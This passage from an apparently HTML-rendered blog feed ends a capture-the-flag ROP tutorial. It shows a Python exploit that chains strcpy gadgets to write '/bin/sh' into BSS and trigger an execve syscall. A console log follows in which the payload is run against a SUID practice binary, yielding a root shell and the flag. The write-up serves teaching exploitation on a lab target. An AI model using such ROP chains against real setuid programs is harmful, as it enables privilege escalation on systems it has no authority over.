</span><span class='line'><span class="n">iaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0804a0ca</span><span class="p">)</span>
</span><span class='line'><span class="n">naddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048b65</span><span class="p">)</span>
</span><span class='line'><span class="n">saddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048110</span><span class="p">)</span>
</span><span class='line'><span class="n">haddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048113</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">off</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">slashaddr</span>  <span class="c"># /</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">baddr</span>      <span class="c"># b</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">iaddr</span>      <span class="c"># i</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">naddr</span>      <span class="c"># n</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">slashaddr</span>  <span class="c"># /</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="n">saddr</span>      <span class="c"># s</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="n">haddr</span>      <span class="c"># h</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">xoreax</span> <span class="o">+</span> <span class="n">boom</span>                <span class="c"># The xor gadget also pops.</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">popedx</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="c"># Put the address of BSS + 7.</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">movedx</span>                       <span class="c"># Store a NUL after the string.</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">xoreax</span> <span class="o">+</span> <span class="n">boom</span>                <span class="c"># The xor gadget also pops.</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">inceax</span> <span class="o">*</span> <span class="n">execvenb</span>            <span class="c"># eax = 11.</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">popebx</span> <span class="o">+</span> <span class="n">bssaddr</span>             <span class="c"># ebx = &quot;/bin/sh\0&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">syscall</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>In conclusion, the execution of the SUID binary with the payload as an argument
to capture the flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level2@rop:~$</span> ./level2 <span class="sb">`</span>python boom.py<span class="sb">`</span>
</span><span class='line'><span class="go">[+] ROP tutorial level2</span>
</span><span class='line'><span class="go">[+] Bet you can&#39;t ROP me this time around, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA#@#</span>
</span><span class='line'><span class="go">                                                                                              ##A#</span>
</span><span class='line'><span class="go">                                                                                                b#B#</span>
</span><span class='line'><span class="go">                                                                                                   #C#</span>
</span><span class='line'><span class="go">                                                                                                     e#D#</span>
</span><span class='line'><span class="go">                                                                                                        ##E#</span>
</span><span class='line'><span class="go">                                                                                                           #F#</span>
</span><span class='line'><span class="go">                                                                                                           DCBAvG#</span>
</span><span class='line'><span class="go">                                                                                                                DCBA#@#</span>
</span><span class='line'><span class="go">                                                                                                                      #!</span>
</span><span class='line'><span class="gp">#</span> cat flag
</span><span class='line'><span class="go">flag{to_rop_or_not_to_rop}</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
</feed>
